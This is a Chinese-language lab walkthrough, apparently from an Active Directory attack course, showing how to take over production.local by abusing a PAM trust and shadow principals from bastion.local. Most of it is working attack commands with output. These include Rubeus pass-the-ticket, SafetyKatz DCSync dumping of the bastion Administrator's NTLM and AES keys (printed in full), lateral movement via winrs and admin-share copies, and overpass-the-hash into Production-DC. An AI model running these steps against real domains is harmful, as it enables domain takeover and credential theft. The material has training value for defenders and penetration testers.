Task
•  Compromise production.local by abusing PAM trust between bastion.local and production.local


- [什么是 privileged access management (PAM)？](https://www.microsoft.com/zh-cn/security/business/security-101/what-is-privileged-access-management-pam)

> Privileged Access Management (PAM) 是一种标识安全解决方案，可通过监视、检测和防范对关键资源的未经授权的特权访问，帮助组织免受网络威胁。PAM 通过人员、流程和技术的组合运作，使你能够了解谁正在使用特权帐户，以及他们在登录时执行什么操作。限制可访问管理功能的用户数量可提高系统安全性，而额外的保护层可缓解威胁行动者造成的数据泄露。

- [什么是特权访问管理（PAM）？](https://www.cyberark.com/zh-hans/what-is/privileged-access-management/)
> 组织实施特权访问管理（PAM）以防止凭据盗用和特权滥用所造成的威胁。PAM是指由人员、流程和技术组成的综合网络安全策略，用于控制、监视、保护和审核整个企业IT环境中所有人类和非人类特权身份和活动。

> PAM有时被称为特权身份管理（PIM）或特权访问安全（PAS），其以最小权限原则为基础，即用户仅获得执行其工作职能所需的最低访问级别。最小权限原则被广泛认为是网络安全的最佳实践，并且是保护对高价值数据和资产的特权访问的基本步骤。通过执行最小权限原则，组织可以减少攻击面并降低恶意内部人士或外部网络攻击可能导致代价高昂的数据泄露的风险。



拿到一个techcorp.local DA的shell
```
C:\AD\Tools\Rubeus.exe asktgt /user:techcorp.local\Administrator /dc:techcorp-dc.techcorp.local /rc4:bc4cf9b751d196c4b6e1a2ba923ef33f  /nowrap /ptt
```

使用Active Directory模块，枚举Foreign Security Principals(FSPs)，注意最后一条结果

```
PS C:\Users\Administrator> Get-ADObject -Filter {objectClass -eq "foreignSecurityPrincipal"} -Server bastion.local
Get-ADObject -Filter {objectClass -eq "foreignSecurityPrincipal"} -Server bastion.local

DistinguishedName                                                                                 Name
-----------------                                                                                 ----
CN=S-1-5-4,CN=ForeignSecurityPrincipals,DC=bastion,DC=local                                       S-1-5-4
CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=bastion,DC=local                                      S-1-5-11
CN=S-1-5-17,CN=ForeignSecurityPrincipals,DC=bastion,DC=local                                      S-1-5-17
CN=S-1-5-9,CN=ForeignSecurityPrincipals,DC=bastion,DC=local                                       S-1-5-9
CN=S-1-5-21-2781415573-3701854478-2406986946-500,CN=ForeignSecurityPrincipals,DC=bastion,DC=local S-1-5-21-278141557...
```

techcorp.local 的 DA 是 bastion.local 组的一部分。 要找出它是哪个组的成员，运行以下命令

```
PS C:\Users\Administrator> Get-ADGroup -Filter * -Properties Member -Server bastion.local | ?{$_.Member -match 'S-1-5-21-2781415573-3701854478-2406986946-500'}
Get-ADGroup -Filter * -Properties Member -Server bastion.local | ?{$_.Member -match 'S-1-5-21-2781415573-3701854478-2406986946-500'}


DistinguishedName : CN=Administrators,CN=Builtin,DC=bastion,DC=local
GroupCategory     : Security
GroupScope        : DomainLocal
Member            : {CN=S-1-5-21-2781415573-3701854478-2406986946-500,CN=ForeignSecurityPrincipals,DC=bastion,DC=local,
                     CN=Domain Admins,CN=Users,DC=bastion,DC=local, CN=Enterprise Admins,CN=Users,DC=bastion,DC=local,
                    CN=Administrator,CN=Users,DC=bastion,DC=local}
Name              : Administrators
ObjectClass       : group
ObjectGUID        : 788f92b1-3806-4eef-bcaa-dd8111f45aa5
SamAccountName    : Administrators
SID               : S-1-5-32-544
```

techcorp.local的域管理员是 bastion.local 上本地管理员组的成员

这里重启一个cmd的techcorp.local DA的shell

```
C:\AD\Tools\Rubeus.exe asktgt /domain:techcorp.local /user:administrator /aes256:58db3c598315bf030d4f1f07021d364ba9350444e3f391e167938dd998836883 /dc:techcorp-dc.techcorp.local /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

在新的cmd下，拷贝文件到bastion.local

```
echo F | xcopy C:\AD\Tools\InviShell\InShellProf.dll \\bastion-dc.bastion.local\C$\Users\Public\InShellProf.dll /Y

echo F | xcopy C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat \\bastion-dc.bastion.local\C$\Users\Public\RunWithRegistryNonAdmin.bat /Y
```

横向到bastion-dc
```
C:\Windows\system32>winrs -r:bastion-dc.bastion.local cmd
Microsoft Windows [Version 10.0.17763.2928]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\Administrator.TECHCORP>whoami
whoami
techcorp\administrator

C:\Users\Administrator.TECHCORP>hostname
hostname
Bastion-DC

C:\Users\Administrator.TECHCORP>C:\Users\Public\RunWithRegistryNonAdmin.bat

...
```

检查是否启用了 PAM 信任。 首先枚举 bastion.local 上的信任。 因为我们已经在域控制器上，所以我们可以使用 Active Directory 模块

```
PS C:\Users\Administrator.TECHCORP> Get-ADTrust -Filter {(ForestTransitive -eq $True) -and (SIDFilteringQuarantined -eq $False)}
Get-ADTrust -Filter {(ForestTransitive -eq $True) -and (SIDFilteringQuarantined -eq $False)}


Direction               : Outbound
DisallowTransivity      : False
DistinguishedName       : CN=techcorp.local,CN=System,DC=bastion,DC=local
ForestTransitive        : True
IntraForest             : False
IsTreeParent            : False
IsTreeRoot              : False
Name                    : techcorp.local
ObjectClass             : trustedDomain
ObjectGUID              : 05498dce-bdab-4a88-946d-077d5dd0da16
SelectiveAuthentication : False
SIDFilteringForestAware : False
SIDFilteringQuarantined : False
Source                  : DC=bastion,DC=local
Target                  : techcorp.local
TGTDelegation           : False
TrustAttributes         : 8
TrustedPolicy           :
TrustingPolicy          :
TrustType               : Uplevel
UplevelOnly             : False
UsesAESKeys             : False
UsesRC4Encryption       : False

Direction               : Inbound
DisallowTransivity      : False
DistinguishedName       : CN=production.local,CN=System,DC=bastion,DC=local   #看这里
ForestTransitive        : True  #看这里
IntraForest             : False
IsTreeParent            : False
IsTreeRoot              : False
Name                    : production.local
ObjectClass             : trustedDomain
ObjectGUID              : 3e0958ef-54c4-4afe-b4df-672150c1dbfc
SelectiveAuthentication : False
SIDFilteringForestAware : False  #看这里
SIDFilteringQuarantined : False
Source                  : DC=bastion,DC=local
Target                  : production.local
TGTDelegation           : False
TrustAttributes         : 8
TrustedPolicy           :
TrustingPolicy          :
TrustType               : Uplevel
UplevelOnly             : False
UsesAESKeys             : False
UsesRC4Encryption       : False

```

一旦我们知道有一个ForestTransitive信任，并且SIDFIlteringForestAware是False，就可以列举production.local上的信任，以确定使用的PAM信任

如果我们试图从bastion.local上的会话访问production.local，我们会发现 会话访问production.local将面临双跳（double hop）问题

所以我们需要使用Overpass-the-hash Bastion.local的管理员

1. 使用techcorp.local的域管理员的权限来提取bastion.local的域名管理员凭据(因为上面得知，techcorp.local的DA是bastion.local的本地管理员)

```
C:\Windows\system32>C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:bastion\Administrator /domain:bastion.local" "exit"

[*] Dumping lsass (708) to C:\Windows\Temp\debug.bin
[+] Dump successful!

[*] Executing loaded Mimikatz PE

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 21 2021 15:08:31
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # lsadump::dcsync /user:bastion\Administrator /domain:bastion.local
[DC] 'bastion.local' will be the domain
[DC] 'Bastion-DC.bastion.local' will be the DC server
[DC] 'bastion\Administrator' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : Administrator

** SAM ACCOUNT **

SAM Username         : Administrator
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Account expiration   :
Password last change : 7/12/2019 9:49:56 PM
Object Security ID   : S-1-5-21-284138346-1733301406-1958478260-500
Object Relative ID   : 500

Credentials:
  Hash NTLM: f29207796c9e6829aa1882b7cccfa36d

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 31b615437127e4a4badbea412c32e37f

* Primary:Kerberos-Newer-Keys *
    Default Salt : BASTION-DCAdministrator
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : a32d8d07a45e115fa499cf58a2d98ef5bf49717af58bc4961c94c3c95fc03292
      aes128_hmac       (4096) : e8679f4d4ed30fe9d2aeabb8b5e5398e
      des_cbc_md5       (4096) : 869b5101a43d73f2
    OldCredentials
      aes256_hmac       (4096) : cf6744ea466302f40e4e56d056ebc647e57c8a89ab0bc6a747c51945bdcba381
      aes128_hmac       (4096) : 709452c5ffe4e274fc731903a63c9148
      des_cbc_md5       (4096) : 29ef1ce323bac8a8
    OlderCredentials
      aes256_hmac       (4096) : 6ee5d99e81fd6bdd2908243ef1111736132f4b107822e4eebf23a18ded385e61
      aes128_hmac       (4096) : 6508ee108b9737e83f289d79ea365151
      des_cbc_md5       (4096) : 31435d975783d0d0

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : BASTION-DCAdministrator
    Credentials
      des_cbc_md5       : 869b5101a43d73f2
    OldCredentials
      des_cbc_md5       : 29ef1ce323bac8a8


mimikatz(commandline) # exit
Bye!

```

2. 在学生机，运行下面命令，拿到一个bastion.local本地administrator的shell
```
C:\AD\Tools\Rubeus.exe asktgt /domain:bastion.local /user:administrator /aes256:a32d8d07a45e115fa499cf58a2d98ef5bf49717af58bc4961c94c3c95fc03292 /dc:bastion-dc.bastion.local /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

3. 复制文件

```
echo F | xcopy C:\AD\Tools\InviShell\InShellProf.dll \\bastion-dc.bastion.local\C$\Users\Public\InShellProf.dll /Y

echo F | xcopy C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat \\bastion-dc.bastion.local\C$\Users\Public\RunWithRegistryNonAdmin.bat /Y
```

4. 横向到bastion-dc

```
C:\ad\Tools>winrs -r:bastion-dc.bastion.local cmd
Microsoft Windows [Version 10.0.17763.2928]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\Administrator>C:\Users\Public\RunWithRegistryNonAdmin.bat
..
```

5. 现在我们在bastion-dc上，可以枚举production.local

```
PS C:\Users\Administrator> Get-ADTrust -Filter {(ForestTransitive -eq $True) -and (SIDFilteringQuarantined -eq $False)} -Server production.local
Get-ADTrust -Filter {(ForestTransitive -eq $True) -and (SIDFilteringQuarantined -eq $False)} -Server production.local


Direction               : Outbound
DisallowTransivity      : False
DistinguishedName       : CN=bastion.local,CN=System,DC=production,DC=local
ForestTransitive        : True  #看这里
IntraForest             : False
IsTreeParent            : False
IsTreeRoot              : False
Name                    : bastion.local
ObjectClass             : trustedDomain
ObjectGUID              : f6ebbca6-749d-4ee6-bb6d-d3bbb178fd02
SelectiveAuthentication : False
SIDFilteringForestAware : True  #看这里，这里表示允许访问SID History
SIDFilteringQuarantined : False
Source                  : DC=production,DC=local
Target                  : bastion.local
TGTDelegation           : False
TrustAttributes         : 1096  #看这里
TrustedPolicy           :
TrustingPolicy          :
TrustType               : Uplevel
UplevelOnly             : False
UsesAESKeys             : False
UsesRC4Encryption       : False
```

从上面枚举可知，从bastion.local 到 production.local 允许访问SID History


6. 检查bastion.local 上的Shadow Security Principals的成员
```
PS C:\Users\Administrator> Get-ADObject -SearchBase ("CN=Shadow Principal Configuration,CN=Services," + (Get-ADRootDSE).configurationNamingContext) -Filter * -Properties * | select Name,member,msDS-ShadowPrincipalSid | fl

Name                    : Shadow Principal Configuration
member                  : {}
msDS-ShadowPrincipalSid :

Name                    : prodforest-ShadowEnterpriseAdmin
member                  : {CN=Administrator,CN=Users,DC=bastion,DC=local}
msDS-ShadowPrincipalSid : S-1-5-21-1765907967-2493560013-34545785-519
```

以上枚举可知：

bastion.local的管理员是Shadow Security Principals的成员，它被映射到production.local的企业管理员组。也就是说，bastion.local的管理员在production.local上有企业管理员的权限。



现在，我们可以作为bastion.local的域管理员从我们当前的域us.techcorp.local访问production.local DC。但是，production.local没有DNS条目，也没有与我们当前域us.techcorp.local的信任，我们需要使用production.local的DC的IP地址来访问它。


在bastion-dc上运行下面的命令，获得production.local DC的IP

```
PS C:\Users\Administrator> Get-DnsServerZone -ZoneName production.local |fl *
Get-DnsServerZone -ZoneName production.local |fl *


MasterServers          : 192.168.102.1
DistinguishedName      : DC=production.local,cn=MicrosoftDNS,DC=ForestDnsZones,DC=bastion,DC=local
IsAutoCreated          : False
IsDsIntegrated         : True
IsPaused               : False
IsReadOnly             : False
IsReverseLookupZone    : False
IsShutdown             : False
ZoneName               : production.local
ZoneType               : Forwarder
DirectoryPartitionName : ForestDnsZones.bastion.local
ForwarderTimeout       : 3
ReplicationScope       : Forest
UseRecursion           : False
PSComputerName         :
CimClass               : root/Microsoft/Windows/DNS:DnsServerConditionalForwarderZone
CimInstanceProperties  : {DistinguishedName, IsAutoCreated, IsDsIntegrated, IsPaused...}
CimSystemProperties    : Microsoft.Management.Infrastructure.CimSystemProperties
```

为了使用PowerShell Remoting连接到一个IP地址，我们必须修改学生虚拟机上的WSMan Trustedhosts属性。在学生虚拟机上以admin权限的PowerShell运行以下命令

```
Set-Item WSMan:\localhost\Client\TrustedHosts * -Force
```

此外，为了连接到一个IP地址，我们必须使用NTLM认证。因此，我们需要 运行OverPass-The-Hash，使用NTLM的哈希值，而不是bastion.local的域名管理员的AES密钥。

```
C:\AD\Tools\SafetyKatz.exe "sekurlsa::pth /user:administrator /domain:bastion.local /ntlm:f29207796c9e6829aa1882b7cccfa36d /run:powershell.exe" "exit"
```

在上面新生成的powershell窗口,访问Production-DC
```
PS C:\Windows\system32> Enter-PSSession 192.168.102.1 -Authentication NegotiateWithImplicitCredential
[192.168.102.1]: PS C:\Users\Administrator.BASTION\Documents> whoami
bastion\administrator
[192.168.102.1]: PS C:\Users\Administrator.BASTION\Documents> hostname
Production-DC
[192.168.102.1]: PS C:\Users\Administrator.BASTION\Documents>
```